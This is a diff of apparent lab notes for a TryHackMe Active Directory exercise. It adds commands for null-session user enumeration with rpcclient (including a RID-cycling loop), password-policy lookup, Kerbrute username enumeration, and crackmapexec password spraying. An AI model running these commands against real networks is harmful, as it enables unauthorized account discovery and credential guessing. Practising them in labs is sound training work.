@@ -16,10 +16,21 @@ ldapsearch -x -H ldap://10.211.11.10 -s base
 ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)" 
 
 enum4linux-ng -A 10.211.11.10 -oA results.txt
-rpcclient -U "" 10.211.11.10 -N
-  > enumdomusers
-  If enumdomusers is restricted
-for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
 
-Username Enumeration With Kerbrute:-
+user-passwd info :-
+1. rpcclient -U "" 10.211.11.10 -N -c enumdomusers | grep -oP '(?<=user:\[)[^\]]+' > user.txt
+2. rpcclient -U "" 10.211.11.10 -N
+    > enumdomusers   (user name)
+    > getdompwinfo   (password info)
+  If enumdomusers is restricted
+3. for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
+
+
+Username Enumeration :-
 ./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
+
+Password Spraying:-
+rpcclient -U "" 10.211.11.10 -N
+    > getdowmpwinfo
+crackmapexec smb 10.211.11.10 --pass-pol
+crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
